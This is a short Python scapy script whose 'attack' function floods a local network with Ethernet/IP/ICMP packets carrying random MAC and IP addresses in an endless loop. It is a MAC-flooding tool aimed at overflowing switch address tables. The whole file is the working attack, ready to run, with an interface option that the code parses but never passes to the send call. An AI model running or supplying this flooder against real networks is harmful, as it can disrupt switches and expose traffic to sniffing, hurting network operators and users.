from scapy.all import *
import optparse


def attack(interface):
    pkt = Ether(src=RandMAC(), dst=RandMAC()) / IP(src=RandIP(), dst=RandIP()) / ICMP()
    sendp(pkt)  # win7下加该参数无效, iface=interface
    print(pkt.summary())


def main():
    parser = optparse.OptionParser("%prog " + "-i interface")
    parser.add_option('-i', dest='interface', default='eth0', type='string', help='Interface')
    (options, args) = parser.parse_args()
    interface = options.interface
    try:
        while True:
            attack(interface)
    except KeyboardInterrupt:
        print('-------------')
        print('Finished!')


if __name__ == '__main__':
    main()